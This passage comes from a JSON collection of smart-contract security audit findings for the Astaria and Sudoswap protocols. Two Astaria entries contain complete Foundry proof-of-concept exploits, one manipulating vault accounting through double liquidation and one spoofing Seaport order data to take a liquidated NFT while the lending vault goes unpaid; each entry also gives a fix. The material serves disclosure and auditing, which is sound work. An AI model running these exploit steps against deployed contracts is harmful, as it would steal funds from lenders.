vm.label(liquidatorTwo, \"liquidator 2\");\n    \n    // Liquidate the first lien\n    vm.startPrank(liquidatorOne);\n    OrderParameters memory listedOrder = _liquidate(stackOne);\n    vm.stopPrank();\n    \n    assertEq(\n        LIEN_TOKEN.getAuctionLiquidator(collateralIdOne),\n        liquidatorOne,\n        \"liquidator is not stored in s.collateralLiquidator[collateralId]\"\n    );\n    \n    // Liquidate the first lien with a different liquidator\n    vm.startPrank(liquidatorTwo);\n    listedOrder = _liquidate(stackOne);\n    vm.stopPrank();\n    \n    assertEq(\n        LIEN_TOKEN.getAuctionLiquidator(collateralIdOne),\n        liquidatorTwo,\n        \"liquidator is not stored in s.collateralLiquidator[collateralId]\"\n    );\n    \n    // Validate the slope is updated twice for the same expired lien\n    // and so the accounting for the public vault is manipulated\n    assertEq(\n        PublicVault(payable(publicVault)).getSlope(),\n        0,\n        \"PublicVault slope divergent\"\n    );\n    \n    // publicVault.storageSlot.epochData[epoch].liensOpenForEpoch is also decremented twice\n    // CollateralToken.storageSlot.idToUnderlying[params.collateralId].auctionHash can also be manipulated, !\n}\n```\n\n## Recommendation:\nWhen `AstariaRouter.liquidate(...)` is called, make sure the expired lien/stack does not have any active liquidation auction before performing any actions. For example, one can check the values of:\n- `s.collateralLiquidator[stack.lien.collateralId].liquidator`\n- `s.idToUnderlying[params.collateralId].auctionHash`\n\n**Astaria:** Fixed in PR 333 by checking `s.collateralLiquidator[stack.lien.collateralId].liquidator`.  \n**Spearbit:** Fixed.",
      "summary": "\nThis bug report is about a vulnerability in the Astaria protocol which allows multiple adversaries to manipulate parameters by calling the endpoint AstariaRouter.liquidate(...) multiple times for an expired stack/lien. This can lead to manipulation of storage parameters such as s.collateralLiquidator[stack.lien.collateralId].amountOwed inLienToken, s.collateralLiquidator[stack.lien.collateralId].liquidator inLienToken, s.idToUnderlying[params.collateralId].auctionHash inCollateralToken, slope inPublicVault, s.epochData[epoch].liensOpenForEpoch inPublicVault, and yIntercept inPublicVault.\n\nTo prevent this vulnerability from occurring, the protocol should check the values of s.collateralLiquidator[stack.lien.collateralId].liquidator or s.idToUnderlying[params.collateralId].auctionHash before performing any actions when AstariaRouter.liquidate(...) is called. This was fixed in PR 333 by checking s.collateralLiquidator[stack.lien.collateralId].liquidator and Spearbit has also fixed the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21833",
      "title": "The extra data (encoded stack ) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context:\n- `CollateralToken.sol#L125`\n- `CollateralToken.sol#L145-L148`\n- `CollateralToken.sol#L150-L152`\n- `CollateralToken.sol#L175`\n\n## Description:\nThe extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the `CollateralToken` upon callback when `validateOrder(...)` is called by Seaport. When a stack /lien gets liquidated, an auction is created on Seaport with the offerer and zone set as the `CollateralToken`, and the order type is full restricted, so that the aforementioned callback is performed at the end of fulfillment/matching orders on Seaport.\n\nAn extra piece of information that needs to be provided by the fulfiller or matcher on Seaport is the extra data, which is the encoded stack. The only validation that happens during the callback is the following, to ensure that the first consideration's token matches with the decoded stack 'lien's token:\n\n```solidity\nERC20 paymentToken = ERC20(zoneParameters.consideration[0].token);\nif (address(paymentToken) != stack.lien.token) {\n    revert InvalidPaymentToken();\n}\n```\n\nBesides that, there is no check that this stack corresponds to the same `collateralId` with the same lien id. So, a bidder on Seaport can take advantage of this and provide a spoofed extra data as follows:\n\n1. The borrower collateralizes its NFT token and takes a lien from a public vault.\n2. The lien expires, and a liquidator calls `liquidate(...)` for the corresponding stack.\n3. The bidder creates a private vault and deposits 1 wei worth of WETH into it.\n4. The bidder collateralizes a fake NFT token and takes a lien with 1 wei worth of WETH as a loan.\n5. The bidder provides the encoded fake stack from step 4 as an extra data to settle the auction for the real liquidated lien from step 2 on Seaport.\n\nThe net result from these steps is that:\n- The original NFT token will be owned by the bidder.\n- The change in the sum of the ETH and WETH balances of the borrower, liquidator, and bidder would be the original borrowed amount from step 1 (might be off by a few wei due to division errors when calculating the liquidator fees).\n- The original public vault would not receive its loan amount from the borrower or the auction amount from the Seaport liquidation auction.\n\nIf the borrower, the liquidator, and the bidder were the same, this entity would end up with its original NFT token plus the loaned amount from the original public vault. If the liquidator and the bidder were the same, the bidder would end up with the original NFT token and might have to pay around 1 wei due to division errors. The borrower gets to keep its loan. The public vault would not receive the loan or any portion of the amount settled in the liquidation auction.\n\n## The following diff in the test contracts is needed for the PoC to work:\n```diff\ndiff --git a/src/test/TestHelpers.t.sol b/src/test/TestHelpers.t.sol\nindex fab5fbd..5c9bfc8 100644\n--- a/src/test/TestHelpers.t.sol\n+++ b/src/test/TestHelpers.t.sol\n@@ -163,7 +163,6 @@ contract ConsiderationTester is BaseSeaportTest, AmountDeriver {\n    vm.label(address(this), \"testContract\");\n }\n}\n-\ncontract TestHelpers is Deploy, ConsiderationTester {\n using CollateralLookup for address;\n using Strings2 for bytes;\n@@ -1608,7 +1607,7 @@ contract TestHelpers is Deploy, ConsiderationTester {\n orders,\n new CriteriaResolver[](0),\n fulfillments,\n- address(this)\n+ incomingBidder.bidder\n );\n } else {\n consideration.fulfillAdvancedOrder(\n@@ -1621,7 +1620,7 @@ contract TestHelpers is Deploy, ConsiderationTester {\n ),\n new CriteriaResolver[](0),\n bidderConduits[incomingBidder.bidder].conduitKey,\n- address(this)\n+ incomingBidder.bidder\n );\n}\ndelete fulfillments;\n```\n\n## The PoC:\n```solidity\nforge t --mt testScenario9 --ffi -vvv\n// add the following test case to\n// file: src/test/LienTokenSettlementScenarioTest.t.sol\n// Scenario 8: commitToLien -> liquidate -> settle Seaport auction with mismatching stack as an extraData,\nfunction testScenario9() public {\n    TestNFT nft = new TestNFT(1);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(0);\n    vm.label(address(this), \"borrowerContract\");\n    {\n        // create a PublicVault with a 14-day epoch\n        address publicVault = _createPublicVault(\n            strategistOne,\n            strategistTwo,\n            14 days,\n            1e17\n        );\n        vm.label(publicVault, \"Public Vault\");\n        // lend 10 ether to the PublicVault as address(1)\n        _lendToVault(\n            Lender({addr: address(1), amountToLend: 10 ether}),\n            payable(publicVault)\n        );\n        emit log_named_uint(\"Public vault WETH balance before committing to a lien\",\n            WETH9.balanceOf(publicVault));\n        emit log_named_uint(\"borrower ETH balance before committing to a lien\", address(this).balance);\n        emit log_named_uint(\"borrower WETH balance before committing to a lien\",\n            WETH9.balanceOf(address(this)));\n        // borrow 10 eth against the dummy NFT with tokenId 0\n        (, ILienToken.Stack memory stack) = _commitToLien({\n            vault: payable(publicVault),\n            strategist: strategistOne,\n            strategistPK: strategistOnePK,\n            tokenContract: tokenContract,\n            tokenId: tokenId,\n            lienDetails: ILienToken.Details({\n                maxAmount: 50 ether,\n                rate: (uint256(1e16) * 150) / (365 days),\n                duration: 10 days,\n                maxPotentialDebt: 0 ether,\n                liquidationInitialAsk: 100 ether\n            }),\n            amount: 10 ether\n        });\n        assertEq(\n            nft.ownerOf(tokenId),\n            address(COLLATERAL_TOKEN),\n            \"The bidder did not receive the collateral token after the auction end.\"\n        );\n        emit log_named_uint(\"Public vault WETH balance after committing to a lien\",\n            WETH9.balanceOf(publicVault));\n        emit log_named_address(\"NFT token owner\", nft.ownerOf(tokenId));\n        emit log_named_uint(\"borrower ETH balance after committing to a lien\", address(this).balance);\n        emit log_named_uint(\"borrower WETH balance after committing to a lien\",\n            WETH9.balanceOf(address(this)));\n        uint256 collateralId = tokenContract.computeId(tokenId);\n        // verify the strategist has no shares minted\n        assertEq(\n            PublicVault(payable(publicVault)).balanceOf(strategistOne),\n            0,\n            \"Strategist has incorrect share balance\"\n        );\n        // verify that the borrower has the CollateralTokens\n        assertEq(\n            COLLATERAL_TOKEN.ownerOf(collateralId),\n            address(this),\n            \"CollateralToken not minted to borrower\"\n        );\n        // fast forward to the end of the lien one\n        vm.warp(block.timestamp + 10 days);\n        address liquidatorOne = vm.addr(0x1195da7051);\n        vm.label(liquidatorOne, \"liquidator 1\");\n        // liquidate the lien\n        vm.startPrank(liquidatorOne);\n        emit log_named_uint(\"liquidator WETH balance before liquidation\", WETH9.balanceOf(liquidatorOne));\n        OrderParameters memory listedOrder = _liquidate(stack);\n        vm.stopPrank();\n        assertEq(\n            LIEN_TOKEN.getAuctionLiquidator(collateralId),\n            liquidatorOne,\n            \"liquidator is not stored in s.collateralLiquidator[collateralId]\"\n        );\n        // --- start of the attack ---\n        vm.label(bidder, \"bidder\");\n        vm.startPrank(bidder);\n        TestNFT fakeNFT = new TestNFT(1);\n        address fakeTokenContract = address(fakeNFT);\n        uint256 fakeTokenId = uint256(0);\n        vm.stopPrank();\n        address privateVault = _createPrivateVault(\n            bidder,\n            bidder\n        );\n        vm.label(privateVault, \"Fake Private Vault\");\n        _lendToPrivateVault(\n            PrivateLender({\n                addr: bidder,\n                amountToLend: 1 wei,\n                token: address(WETH9)\n            }),\n            payable(privateVault)\n        );\n        vm.startPrank(bidder);\n        // it is important that the fakeStack.lien.token is the same as the original stack's token\n        // below deals 1 wei to the bidder which is also the fakeStack borrower\n        (, ILienToken.Stack memory fakeStack) = _commitToLien({\n            vault: payable(privateVault),\n            strategist: bidder,\n            strategistPK: bidderPK,\n            tokenContract: fakeTokenContract,\n            tokenId: fakeTokenId,\n            lienDetails: ILienToken.Details({\n                maxAmount: 1 wei,\n                rate: 1, // needs to be non-zero\n                duration: 1 hours, // s.minLoanDuration\n                maxPotentialDebt: 0 ether,\n                liquidationInitialAsk: 1 wei\n            }),\n            amount: 1 wei\n        });\n        emit log_named_uint(\"CollateralToken WETH balance before auction end\",\n            WETH9.balanceOf(address(COLLATERAL_TOKEN)));\n        // _bid deals 300 ether to the bidder\n        _bid(\n            Bidder({bidder: bidder, bidderPK: bidderPK}),\n            listedOrder, // order parameters created for the original stack during the liquidation\n            100 ether, // stack.lien.details.liquidationInitialAsk\n            fakeStack\n        );\n        emit log_named_uint(\"Public vault WETH balance after auction end\", WETH9.balanceOf(publicVault));\n        emit log_named_uint(\"borrower WETH balance after auction end\", WETH9.balanceOf(address(this)));\n        emit log_named_uint(\"liquidator WETH balance after auction end\", WETH9.balanceOf(liquidatorOne));\n        emit log_named_uint(\"bidder WETH balance after auction end\", WETH9.balanceOf(bidder));\n        emit log_named_uint(\"bidder ETH balance before committing to a lien\", address(bidder).balance);\n        emit log_named_uint(\"CollateralToken WETH balance after auction end\",\n            WETH9.balanceOf(address(COLLATERAL_TOKEN)));\n        emit log_named_address(\"bidder\", bidder);\n        emit log_named_address(\"owner of the original collateral after auction end\",\n            nft.ownerOf(tokenId));\n        // _removeLien is not called for collateralId\n        assertEq(\n            LIEN_TOKEN.getAuctionLiquidator(collateralId),\n            liquidatorOne,\n            \"_removeLien is called for collateralId\"\n        );\n        // WETH balance of the public vault is still 0 even after the auction\n        assertEq(\n            WETH9.balanceOf(publicVault),\n        );\n    }\n    assertEq(\n        nft.ownerOf(tokenId),\n        bidder,\n        \"The bidder did not receive the collateral token after the auction end.\"\n    );\n}\n```\n\n## Recommendation:\nIn `invalidateOrder(...)`, in the 1st `if` branch when `zoneParameters.offerer == address(this)`, make sure:\n1. `stack.lien.collateralId == collateralId` (collateralId)\n2. It might be good to also check `LIEN_TOKEN.getCollateralState(collateralId) == keccak256(abi.encode(stack)) == keccak256(zoneParameters.extraData)`. But if 1. is satisfied, this requirement will be checked in `makePayment(...)`.\n\n### Astaria:\nFixed in PR 334 below by checking `stack.lien.collateralId == collateralId`.\n\n### Spearbit:\nFixed.",
      "summary": "\nThis bug report is about a vulnerability in CollateralToken.sol, where extra data (encoded stack) provided to advanced orders on Seaport are not validated properly when validateOrder(...) order is called by Seaport. This vulnerability allows a bidder to take advantage of the situation by providing a spoofed extra data. This could result in the original NFT token being owned by the bidder, the borrower keeping their loan, and the public vault not receiving its loan amount from the borrower or the auction amount the Seaport liquidation auction.\n\nTo fix this vulnerability, InvalidateOrder(...) should be modified in the 1st ifbranch when zoneParameters.offerer == address(this). This would involve checking that stack.lien.collaterlId == collateralId (collateralId ) and potentially also checking LIEN_TOKEN.getCollateralState(collateralId) == keccak256(abi.encode(stack)) == keccak256(zoneParameters.extraData).\n\nThe PoC (Proof of Concept) and the diff in the test contracts needed for the PoC to work are also provided in the bug report. The bug has been fixed in PR 334 by checking stack.lien.collaterlId == collateralId.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "18430",
      "title": "Cache local variable earlier in `LSSVMPairERC20::_pullTokenInputs`",
      "impact": "GAS",
      "content": "Given that there are multiple instances where `token()` is called directly, the local variable `ERC20 token_ = token()` should be cached in the same manner as `_assetRecipient` at the start of the function to reduce the number of storage reads.\n\nIt is also recommended to cache `factory()` in `LSSVMPairERC1155::swapTokenForSpecificNFTs` and `LSSVMPairERC721::swapTokenForSpecificNFTs`. There is no need to cache `poolType()` in `LSSVMPairERC1155::swapNFTsForToken`, `LSSVMPairERC721::swapTokenForSpecificNFTs` and `LSSVMPairERC721::_swapNFTsForToken` as it is used only once.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18429",
      "title": "Simplify `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams` and `LSSVMPair::_calculateSellInfoAndUpdatePoolParams` conditionals",
      "impact": "GAS",
      "content": "Per the comment \"Consolidate writes to save gas\" in `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams`, further optimizations can be made by reducing the logic to two if statements and storing values/emitting events together as follows:\n```solidity\n// Consolidate writes to save gas\n// Emit spot price update if it has been updated\nif (currentSpotPrice != newSpotPrice) {\n    spotPrice = newSpotPrice;\n    emit SpotPriceUpdate(newSpotPrice);\n}\n\n// Emit delta update if it has been updated\nif (currentDelta != newDelta) {\n    delta = newDelta;\n    emit DeltaUpdate(newDelta);\n}\n```\nThe same recommendation applies to `LSSVMPair::_calculateSellInfoAndUpdatePoolParams`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18428",
      "title": "Redundant zero value check in `LSSVMPair::getBuyNFTQuote` and `LSSVMPair::getSellNFTQuote`",
      "impact": "GAS",
      "content": "The `numNFTs` argument to `LSSVMPair::getBuyNFTQuote` is validated to be a non-zero value; however, in `ICurve::getBuyNFTQuote`, all current implementations revert if the `numItems` parameter is zero, and so this check on the pair is redundant. The same reasoning applies to `LSSVMPair::getSellNFTQuote`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18427",
      "title": "Redundant zero address check in `LSSVMPair::initialize`",
      "impact": "GAS",
      "content": "The initializer argument `_assetRecipient` is assigned to the state variable only if it is not the zero address; however, in `LSSVMPair::getAssetRecipient`, the owner address is returned if `assetRecipient` is the zero address, and so this check is redundant. The default value is `address(0)`, and it will only be used in the `LSSVMPair::getAssetRecipient` function. For `LSSVMPair::getFeeRecipient`, fees will accrue on the pair contract itself in the case of a zero address asset recipient.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18426",
      "title": "`MerklePropertyChecker::hasProperties` does not validate `ids.length` equals `proofList.length`",
      "impact": "LOW",
      "content": "This function loops over supplied ids and performs proof verification to ensure each id is valid.\nIf additional proofs are supplied, the loop will terminate before these are reached and so they are never used in verification, but it is generally best practice to validate array lengths are equal.\n\n**Sudoswap:**\nFixed in commit [0f8f94](https://github.com/sudoswap/lssvm2/pull/113/commits/0f8f94872743d67c304b310d22c653c8d75d80ea).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18425",
      "title": "`LSSVMPair` does not inherit `ILSSVMPair`",
      "impact": "LOW",
      "content": "The interface `ILSSVMPair` is defined and used in several places, but the abstract `LSSVMPair` does not inherit from it.\nConsider adding `is ILSSVMPair` to the `LSSVMPair` contract declaration.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18424",
      "title": "Event parameter names are incorrect",
      "impact": "LOW",
      "content": "The first parameter in each of these `LSSVMPair` events is named incorrectly:\n\n```solidity\nevent SwapNFTInPair(uint256 amountIn, uint256[] ids);\nevent SwapNFTInPair(uint256 amountIn, uint256 numNFTs);\nevent SwapNFTOutPair(uint256 amountOut, uint256[] ids);\nevent SwapNFTOutPair(uint256 amountOut, uint256 numNFTs);\n```\n\nThey should instead look like this:\n\n```solidity\nevent SwapNFTInPair(uint256 amountOut, uint256[] ids);\nevent SwapNFTInPair(uint256 amountOut, uint256 numNFTs);\nevent SwapNFTOutPair(uint256 amountIn, uint256[] ids);\nevent SwapNFTOutPair(uint256 amountIn, uint256 numNFTs);\n```\n\n**Sudoswap:**\nFixed in commit [29449e](https://github.com/sudoswap/lssvm2/commit/29449e45fd7ebaf1b932c135df65b08e998d1071).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18423",
      "title": "`vm.prank()` before nested function call in tests does not work as intended",
      "impact": "LOW",
      "content": "Foundry's prank cheat code applies to the next external call only. [Nested](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/test/base/VeryFastRouterAllSwapTypes.sol#L1090-L1092) [calls](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/test/base/VeryFastRouterWithRoyalties.sol#L1108-L1110) are evaluated right-to-left, and so the prank is not applied as intended. Either cache necessary function calls as local variables or use `vm.startPrank(addr)` and `vm.stopPrank()`. Extending tests to assert for expected event emissions is recommended and should help to catch cases like this.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18422",
      "title": "Unreachable code path in `RoyaltyEngine::_getRoyaltyAndSpec`",
      "impact": "LOW",
      "content": "Within `RoyaltyEngine`, `int16` values have been copied over from the manifold contract for use as enum values relating to different royalty specifications with `int16 private constant NONE = -1;` and `int16 private constant NOT_CONFIGURED = 0;`. The [if case](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L152) in `RoyaltyEngine::_getRoyaltyAndSpec` catches `spec <= NOT_CONFIGURED` so the following [code](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L237-L238) in the else block is not reachable and can be removed.\n```solidity\nif (spec == NONE) {\n    return (recipients, amounts, spec, royaltyAddress, addToCache);\n}\n```\n\n**Sudoswap:**\nFixed in commit [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18421",
      "title": "Incorrect/incomplete NatSpec & comments",
      "impact": "LOW",
      "content": "The NatSpec for `LSSVMPair::getAssetRecipient` currently [reads](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L319) \"Returns the address that assets that receives assets when a swap is done with this pair\" but it should be \"Returns the address that receives assets when a swap is done with this pair\". Additionally, in several instances, NatSpec could be more detailed to better explain parameters and return values, e.g. [`LSSVMPair::getSellNFTQuote`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L245-L249).\n\n`GDACurve::getSellInfo` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/bonding-curves/GDACurve.sol#L180) which currently reads \"The expected output at for an auction at index n...\" but should be \"The expected output for an auction at index n...\".\n\n`LSSVMPairCloner::cloneERC1155ETHPair` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L299) \"RUNTIME (53 bytes of code + 61 bytes of extra data = 114 bytes)\" but this should be 93 bytes of extra data, so 146 bytes total which corresponds to 0x92 runtime size above. The same is true of `LSSVMPairCloner::cloneERC1155ERC20Pair`, which has the [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L386) \"RUNTIME (53 bytes of code + 81 bytes of extra data = 134 bytes)\" but this should be 113 bytes of extra data, so 166 bytes total which corresponds to 0xa6 runtime size above.\n\nThe [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L604) \"this is the max cost we are willing to pay, zero-indexed\" in `VeryFastRouter::_findMaxFillableAmtForSell` should be “this is the minimum output we are expecting from the sale, zero-indexed”.\n\n**Sudoswap:**\nFixed in commits [cb98b6](https://github.com/sudoswap/lssvm2/commit/cb98b66513a5dd149fcf169caafe6be370f5295b) and [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18420",
      "title": "Make `LSSVMPair::call` payable to allow value to be sent with external calls",
      "impact": "LOW",
      "content": "**Description:**\nCurrently, [`LSSVMPair::call`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L640) simply passes a [value of zero](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L661); however, there may be instances in which non-zero `msg.value` is required/desired and so the function should be marked as payable to allow the owner to supply ETH for the external call.\n\n**Impact:**\nIf the owner wishes to send ETH with the external call, they cannot do so, which may impact the external call's functionality.\n\n**Recommended Mitigation:**\nConsider allowing value to be passed to external calls by making `LSSVMPair::call` payable.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18419",
      "title": "Partially fillable order could revert",
      "impact": "LOW",
      "content": "**Description:**\nIn the sell logic of `VeryFastRouter::swap`, the protocol does not check the fillable amount and executes the swap if [`pairSpotPrice == order.expectedSpotPrice`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L281). But this will revert if the pair has insufficient balance. On the other hand, if these criteria are not met, the protocol rechecks the max fillable amount, and a balance check is used in the binary search.\n\n**Impact:**\nPartially fillable orders would revert unnecessarily.\nWhile this does not affect funds, users would experience a revert for valid transactions.\n\n**Recommended Mitigation:**\nConsider handling cases where the pair has insufficient balance to prevent reverting for partially fillable orders.\n\n**Sudoswap:**\nAcknowledged, as long as the bonding curve increases in price (i.e. price to buy the Xth item costs more than the price to buy the Xth-1 item) and the partial fill order is created in reverse order, then this issue is avoided.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18418",
      "title": "Owner calling `LSSVMPair::changeSpotPrice` can cause arithmetic over/underflows on later swaps",
      "impact": "LOW",
      "content": "**Description:**\nChanging the spot price to a value higher than the current ERC20 (or ETH) balance of the pair can cause unintended reverts in valid swap calls later on.\n\n**Proof of Concept:**\n\nFull proof of concept [here](https://github.com/sudoswap/lssvm2/pull/1/files#diff-ccfdcc468a169eaf116e657d2cd2406530c2a693627167e375d78dcf8a73d87d). Snippet:\n\n```solidity\n‌// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport {InvariantERC721LinearERC20} from \"./InvariantERC721LinearERC20.t.sol\";\nimport {IERC721Mintable} from \"../interfaces/IERC721Mintable.sol\";\n\ncontract SwapArithmeticOverflow is InvariantERC721LinearERC20 {\n    function setUp() public override {\n        InvariantERC721LinearERC20.setUp();\n    }\n\n    function test_OverflowFail() public {\n        s_pair.changeSpotPrice(20989589403855433688750111262);\n\n        address payable msgSender = payable(0x0000000000000000000000000000000000004f89);\n        changePrank(msgSender);\n\n        uint256 newNFTId = 333;\n        IERC721Mintable(address(s_test721)).mint(msgSender, newNFTId);\n        (,,, uint256 minOutputAmount,,) = s_pair.getSellNFTQuote(newNFTId, 1);\n        s_test721.approve(address(s_pair), newNFTId);\n        uint256[] memory nftIds = new uint256[](1);\n        nftIds[0] = newNFTId;\n\n        vm.expectRevert(\"TRANSFER_FAILED\");\n        uint256 outputAmount = s_pair.swapNFTsForToken(nftIds, minOutputAmount, msgSender, false, address(0));\n    }\n}\n```\n\n**Impact:**\n`ILSSVMPair::swapNFTsForToken` reverts with a `TRANSFER_FAILED` error message despite the user obtaining a quote using `ILSSVMPair::getSellNFTQuote` in a prior call.\n\n**Recommended Mitigation:**\n`ILSSVMPair::getSellNFTQuote` should return a legitimate error code if the expected output exceeds the pair's balance.\nThis mitigates the impact on the end user trying to perform the swap. It will return a helpful error in the view function prior to the swap attempt rather than passing there, then failing on the actual attempt with an 